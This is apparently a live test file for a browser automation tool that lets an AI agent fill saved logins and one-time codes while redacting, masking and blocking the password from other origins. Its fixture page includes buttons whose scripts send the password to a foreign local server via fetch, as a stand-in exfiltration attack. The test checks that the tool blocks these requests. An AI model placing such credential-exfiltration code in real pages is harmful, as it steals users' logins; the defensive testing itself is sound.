import { expect, test } from "bun:test";
import { existsSync, readdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { create } from "@bufbuild/protobuf";
import { timestampFromDate } from "@bufbuild/protobuf/wkt";
import { AgentPreviewLoginSchema, AgentTool, ThreadSecretDeliverySchema } from "@canopy/contracts";
import { oneTimeCode, parseOneTimeCodeSetup } from "@canopy/domain/one-time-codes";
import { tempDirs } from "@canopy/testing";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
import { z } from "zod";
import { createLocalAutomationMcp } from "../agent-tools-mcp/index.ts";
import { ThreadSecretFiles, threadSecretOutputGuard } from "../runtime/thread-secrets.ts";
import { AgentTools } from "./index.ts";
import { BrowserCdp } from "./browser-cdp.ts";
import { forgetSessionLogins, sessionLogins } from "./browser-logins.ts";
import { captureHidingValues } from "./browser-capture.ts";

const temporary = tempDirs();
const live = process.env["CANOPY_LIVE"] === "1";
const setup = "otpauth://totp/Fixture?secret=GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ";

function servers(password: string) {
  const leaked: string[] = [];

  const foreign = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    fetch(request) {
      leaked.push(request.url);

      return new URL(request.url).pathname === "/form"
        ? new Response('<input id="x" style="width:100vw;height:100vh">', { headers: { "Content-Type": "text/html" } })
        : new Response("ok", { headers: { "Access-Control-Allow-Origin": "*" } });
    },
  });

  const site = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    fetch: (request) =>
      new URL(request.url).pathname === "/locked"
        ? request.headers.get("authorization") ===
          `Basic ${Buffer.from(`abc@example.test:${password}`).toString("base64")}`
          ? new Response("<title>Protected</title>", { headers: { "Content-Type": "text/html" } })
          : new Response("Unauthorized", { status: 401, headers: { "WWW-Authenticate": 'Basic realm="Fixture"' } })
        : new Response(
            `<title>Sign in</title>
        <input id="user" autocomplete="username"><input id="pass" type="password"><input id="code">
        <button id="leak" onclick="fetch('${foreign.url.href}collect?p=' + encodeURIComponent(pass.value)).then(() => document.title = 'sent', () => document.title = 'blocked')">Leak</button>
        <button id="json" onclick="sendJson()">JSON</button>
        <script>
          // An encoder that escapes slashes and every non-ASCII character, as some servers' clients do.
          function sendJson() {
            const body = JSON.stringify({ p: pass.value })
              .replace(/\\//g, "\\\\/")
              .replace(/[\\u0080-\\uffff]/g, (c) => "\\\\u" + c.charCodeAt(0).toString(16).padStart(4, "0"));
            fetch("${foreign.url.href}json", { method: "POST", body })
              .then(() => (document.title = "json sent"), () => (document.title = "json blocked"));
          }
        </script>
        <button id="own" onclick="fetch('/session', { method: 'POST', body: pass.value }).then(() => document.title = 'own sent')">Own</button>
        <style>#rich span { -webkit-text-security: none !important; }</style>
        <div id="rich" contenteditable><span id="richtext">notes</span></div>
        <div id="host"></div>
        <script>document.querySelector("#host").attachShadow({ mode: "open" }).innerHTML = '<input id="inner">';</script>
        <iframe id="frame" src="http://localhost:${foreign.port}/form" style="width:300px;height:80px"></iframe>`,
            { headers: { "Content-Type": "text/html" } },
          ),
  });

  return { site, foreign, leaked };
}

const signal = () => AbortSignal.timeout(10_000);

async function cliJson(cli: string, session: string, args: string[]) {
  const process = Bun.spawn([cli, "--session", session, "--headed", "false", "--json", ...args], { stdout: "pipe" });

  return JSON.parse(await new Response(process.stdout).text()).data;
}

async function endpointOf(cli: string, session: string): Promise<string> {
  return (await cliJson(cli, session, ["get", "cdp-url"])).cdpUrl;
}

async function activeTab(cli: string, session: string): Promise<string> {
  const tabs: { targetId: string; active: boolean }[] = (await cliJson(cli, session, ["tab", "list"])).tabs;

  return tabs.find((tab) => tab.active)!.targetId;
}

/** The frame from the other site runs in its own process: reach it through its own target. */
async function frameSession(cdp: BrowserCdp): Promise<string> {
  const targets = z
    .object({ targetInfos: z.array(z.object({ targetId: z.string(), type: z.string(), url: z.string() })) })
    .parse(await cdp.sendTo(undefined, "Target.getTargets"));

  const frame = targets.targetInfos.find((target) => target.type === "iframe" && target.url.endsWith("/form"));

  if (!frame) throw new Error("The fixture frame did not get its own process");

  return z
    .object({ sessionId: z.string() })
    .parse(await cdp.sendTo(undefined, "Target.attachToTarget", { targetId: frame.targetId, flatten: true })).sessionId;
}

async function inFrame(cdpUrl: string, tab: string, expression: string) {
  const cdp = await BrowserCdp.attach(cdpUrl, tab, signal());

  try {
    return await cdp.sendTo(await frameSession(cdp), "Runtime.evaluate", { expression, returnByValue: true });
  } finally {
    cdp.close();
  }
}

/** The computed text security of the page's fields and the frame's field. */
async function textSecurity(cdpUrl: string, tab: string) {
  const style = "(element) => getComputedStyle(element).webkitTextSecurity";
  const cdp = await BrowserCdp.attach(cdpUrl, tab, signal());

  try {
    const page = z
      .object({ result: z.object({ value: z.object({ user: z.string(), pass: z.string(), code: z.string() }) }) })
      .parse(
        await cdp.send("Runtime.evaluate", {
          expression: `(() => { const s = ${style}; return { user: s(user), pass: s(pass), code: s(code) }; })()`,
          returnByValue: true,
        }),
      ).result.value;

    const frame = z
      .object({ result: z.object({ value: z.string() }) })
      .parse(await inFrame(cdpUrl, tab, `(${style})(document.getElementById("x"))`)).result.value;

    return { ...page, frame };
  } finally {
    cdp.close();
  }
}

/** Focus the input inside the other site's frame, as the owner's click in Preview would. */
async function focusFrameInput(cdpUrl: string, tab: string) {
  const cdp = await BrowserCdp.attach(cdpUrl, tab, signal());

  try {
    const session = await frameSession(cdp);

    const input = z
      .object({ result: z.object({ objectId: z.string() }) })
      .parse(await cdp.sendTo(session, "Runtime.evaluate", { expression: "document.getElementById('x')" }));

    await cdp.sendTo(session, "DOM.focus", { objectId: input.result.objectId });
  } finally {
    cdp.close();
  }
}

test.skipIf(!live)(
  "Browser MCP enters a project login without exposing it and blocks requests that carry it elsewhere",
  async () => {
    const cli = process.env["CANOPY_LIVE_BROWSER"] || Bun.which("agent-browser");

    if (!cli) throw new Error("Set CANOPY_LIVE_BROWSER to the pinned agent-browser executable");
    const dir = temporary("canopy-live-login-");
    const threadId = crypto.randomUUID();
    const turnId = crypto.randomUUID();
    const store = new ThreadSecretFiles(dir);
    // Quotes and a backslash: JSON request bodies escape them.
    const password = `pw-"\\/é-${crypto.randomUUID()}`;
    const { site, foreign, leaked } = servers(password);
    const origin = `http://pr-1090.app.localhost:${site.port}`;
    const websites = [`http://pr-*.app.localhost:${site.port}`];
    const requestId = crypto.randomUUID();
    // Browser logins stay in worker memory: they do not wait for the harness's output filter.
    store.beginProjectTurn(threadId, turnId);

    const receipt = store.apply(
      create(ThreadSecretDeliverySchema, {
        threadId,
        turnId,
        requestId,
        revision: 1,
        memoryOnly: true,
        value: JSON.stringify({
          name: "STAGING_ADMIN",
          username: "abc@example.test",
          password,
          one_time_code_setup: setup,
          websites,
          hide_username: false,
        }),
        expiresAt: timestampFromDate(new Date(Date.now() + 120_000)),
      }),
    );

    expect(receipt).toMatchObject({ applied: true, file: "" });

    const manager = new AgentTools({
      dataDir: dir,
      env: process.env,
      probe: { which: (name) => (name === "agent-browser" ? cli : null) },
      projectLogins: () => store,
      send: () => {},
      progress: () => {},
    });

    const leases: string[] = [];
    let bridge: ReturnType<typeof createLocalAutomationMcp> | undefined;
    const client = new Client({ name: "Canopy login fixture", version: "1" });

    try {
      await manager.probe();
      const authorized: string[] = [];
      bridge = createLocalAutomationMcp({
        servers: manager.localMcpServers([AgentTool.BROWSER], threadId),
        env: process.env as Record<string, string>,
        authorize: async (_server, _name, args) => {
          authorized.push(args);
        },
        context: () => ({
          leaseLogin: async (name, pageOrigin) => {
            leases.push(`${name} ${pageOrigin}`);

            return { ok: true, requestId, turnId };
          },
        }),
      });
      const { url, headers } = bridge.servers[0]!;
      await client.connect(new StreamableHTTPClientTransport(new URL(url), { requestInit: { headers } }));

      const call = (name: string, args = {}) =>
        client.callTool({ name: `agent_browser_${name}`, arguments: args }, undefined, { timeout: 15_000 });

      const text = (result: Awaited<ReturnType<typeof call>>) => JSON.stringify(result.content);
      const tools = (await client.listTools()).tools.map(({ name }) => name);
      expect(tools).toContain("agent_browser_fill_login");
      expect(tools).toContain("agent_browser_fill_one_time_code");

      expect((await call("open", { url: origin })).isError).toBeFalsy();
      const filled = await call("fill_login", { login: "STAGING_ADMIN", username: "#user", password: "#pass" });
      expect(text(filled)).toContain("Entered the username and password");
      expect(leases).toEqual([`STAGING_ADMIN ${origin}`]);

      const read = await call("eval", { script: "document.querySelector('#pass').value" });
      expect(text(read)).not.toContain(password);
      expect(text(read)).toContain("[REDACTED]");
      expect(threadSecretOutputGuard(threadId).redact(`x ${password} y`)).toBe("x [REDACTED] y");
      expect((await call("eval", { script: "document.querySelector('#user').value" })).content).toMatchObject([
        { text: expect.stringContaining("abc@example.test") },
      ]);

      const expected = await oneTimeCode(parseOneTimeCodeSetup(setup)!);
      expect((await call("fill_one_time_code", { login: "STAGING_ADMIN", field: "#code" })).isError).toBeFalsy();
      const code = text(await call("eval", { script: "document.querySelector('#code').value" }));
      expect(
        code.includes(expected.code) || code.includes((await oneTimeCode(parseOneTimeCodeSetup(setup)!)).code),
      ).toBe(true);

      const leak = await call("click", { selector: "#leak" });
      expect(leak.isError).toBeFalsy();
      await Bun.sleep(500);
      const after = await call("get_title");
      expect(text(after)).toContain("blocked");
      expect(text(leak) + text(after)).toContain("Canopy blocked a request");
      expect(leaked.join("\n")).not.toContain(encodeURIComponent(password));

      expect((await call("click", { selector: "#json" })).isError).toBeFalsy();
      await Bun.sleep(500);
      expect(text(await call("get_title"))).toContain("json blocked");
      expect(leaked.some((url) => url.endsWith("/json"))).toBe(false);

      expect((await call("click", { selector: "#own" })).isError).toBeFalsy();
      await Bun.sleep(500);
      expect(text(await call("get_title"))).toContain("own sent");

      const basic = await call("open_with_basic_auth", {
        url: new URL("/locked", origin).href,
        login: "STAGING_ADMIN",
      });

      expect(basic.isError).toBeFalsy();
      expect(text(await call("get_title"))).toContain("Protected");

      // A frame from another website inside an allowed page never receives the login.
      expect((await call("open", { url: origin })).isError).toBeFalsy();
      const framed = await call("fill_login", { login: "STAGING_ADMIN", password: "#frame" });
      const session = manager.localMcpServers([AgentTool.BROWSER], threadId)[0]!.scope!.session;
      const logins = sessionLogins(session, () => Promise.resolve(undefined));
      const cdpUrl = await endpointOf(cli, session);
      expect(framed.isError).toBe(true);
      expect(text(framed)).toContain("which is not one of login STAGING_ADMIN's websites");

      // The owner's fill in Preview checks the focused field's frame, not the tab.
      await focusFrameInput(cdpUrl, await activeTab(cli, session));

      const page = async (signal: AbortSignal) => {
        const tab = await activeTab(cli, session);

        return BrowserCdp.attach(cdpUrl, tab, signal);
      };

      const preview = (text: string) =>
        create(AgentPreviewLoginSchema, {
          name: "STAGING_ADMIN",
          text,
          websites,
          masked: true,
          field: "password",
        });

      await expect(logins.previewFill(page, preview(password), signal())).rejects.toThrow("not for this page");

      expect((await call("click", { selector: "#user" })).isError).toBeFalsy();
      const typed = `typed-${crypto.randomUUID()}`;
      await logins.previewFill(page, preview(typed), signal());
      expect(text(await call("eval", { script: "document.querySelector('#user').value" }))).toContain("[REDACTED]");
      // The screenshot reaches the requested path only after its checks.
      const shotPath = join(dir, "shot.png");
      expect((await call("screenshot", { path: shotPath })).isError).toBeFalsy();
      expect(existsSync(shotPath)).toBe(true);

      // A capture hides fields holding entered values, in the page and in a frame from another process.
      const tab = await activeTab(cli, session);
      await inFrame(cdpUrl, tab, `document.getElementById("x").value = ${JSON.stringify(typed)}`);
      let during: Awaited<ReturnType<typeof textSecurity>> | undefined;

      const captured = await captureHidingValues(
        [typed],
        async (attachSignal) => [await page(attachSignal)],
        async () => {
          during = await textSecurity(cdpUrl, tab);

          return { content: [{ type: "text", text: "captured" }] };
        },
        signal(),
      );

      expect(text(captured!)).toContain("captured");
      expect(during).toEqual({ user: "disc", pass: "disc", code: "none", frame: "disc" });
      expect(await textSecurity(cdpUrl, tab)).toEqual({ user: "none", pass: "disc", code: "none", frame: "none" });

      // A page that changes during the capture discards it.
      const changed = await captureHidingValues(
        [typed],
        async (attachSignal) => [await page(attachSignal)],
        async () => {
          await call("reload");

          return { content: [{ type: "text", text: "captured" }] };
        },
        signal(),
      );

      expect(text(changed!)).toContain("discarded the capture");

      // A field the page remounts without navigating, still holding the value, shows dots too.
      await call("eval", { script: `document.querySelector("#user").value = ${JSON.stringify(typed)}` });
      let remountedDuring: Awaited<ReturnType<typeof textSecurity>> | undefined;

      const remounted = await captureHidingValues(
        [typed],
        async (attachSignal) => [await page(attachSignal)],
        async () => {
          await call("eval", {
            script: `(() => { const field = document.createElement("input"); field.id = "user"; field.value = ${JSON.stringify(typed)}; document.querySelector("#user").replaceWith(field); })()`,
          });
          remountedDuring = await textSecurity(cdpUrl, tab);

          return { content: [{ type: "text", text: "captured" }] };
        },
        signal(),
      );

      expect(text(remounted!)).toContain("captured");

      // The same inside a web component: remounted in its shadow root, then removed before the check.
      let shadowDuring = "";

      const shadowed = await captureHidingValues(
        [typed],
        async (attachSignal) => [await page(attachSignal)],
        async () => {
          await call("eval", {
            script: `(() => { const root = document.querySelector("#host").shadowRoot; const field = document.createElement("input"); field.id = "inner"; field.value = ${JSON.stringify(typed)}; root.querySelector("#inner").replaceWith(field); })()`,
          });
          shadowDuring = text(
            await call("eval", {
              script: `getComputedStyle(document.querySelector("#host").shadowRoot.querySelector("#inner")).webkitTextSecurity`,
            }),
          );
          await call("eval", { script: `document.querySelector("#host").shadowRoot.querySelector("#inner").remove()` });

          return { content: [{ type: "text", text: "captured" }] };
        },
        signal(),
      );

      expect(text(shadowed!)).toContain("captured");

      // Rich text renders through its children, which can turn the mask off for themselves.
      await call("eval", { script: `document.querySelector("#richtext").textContent = ${JSON.stringify(typed)}` });
      const richStyle = `getComputedStyle(document.querySelector("#richtext")).webkitTextSecurity`;
      let richDuring = "";

      const rich = await captureHidingValues(
        [typed],
        async (attachSignal) => [await page(attachSignal)],
        async () => {
          richDuring = text(await call("eval", { script: richStyle }));

          return { content: [{ type: "text", text: "captured" }] };
        },
        signal(),
      );

      expect(text(rich!)).toContain("captured");
      expect(richDuring).toContain("disc");
      expect(text(await call("eval", { script: richStyle }))).toContain("none");
      expect(shadowDuring).toContain("disc");
      expect(remountedDuring?.user).toBe("disc");
      expect((await textSecurity(cdpUrl, tab)).user).toBe("none");

      expect(leaked.join("\n")).not.toContain(password);

      // A worker restart loses the masking state: the next call first closes the browser that held the values.
      const markers = join(dir, "browser-logins");
      const [marker] = readdirSync(markers);
      expect(marker).toBeString();
      forgetSessionLogins(session);
      writeFileSync(join(markers, marker!), "");
      expect(text(await call("get_title"))).not.toContain("Sign in");
      expect(readdirSync(markers)).toEqual([]);

      expect((await call("open", { url: foreign.url.href })).isError).toBeFalsy();
      const elsewhere = await call("fill_login", { login: "STAGING_ADMIN", password: "body" });
      expect(elsewhere.isError).toBe(true);
      expect(authorized.join("\n")).not.toContain(password);
    } finally {
      await client.close();
      await bridge?.close();
      const session = manager.localMcpServers([AgentTool.BROWSER], threadId)[0]?.scope?.session;

      if (session)
        await Bun.spawn([cli, "--session", session, "close"], { stdout: "ignore", stderr: "ignore", timeout: 8_000 })
          .exited;
      await site.stop(true);
      await foreign.stop(true);
      store.close();
    }
  },
  60_000,
);
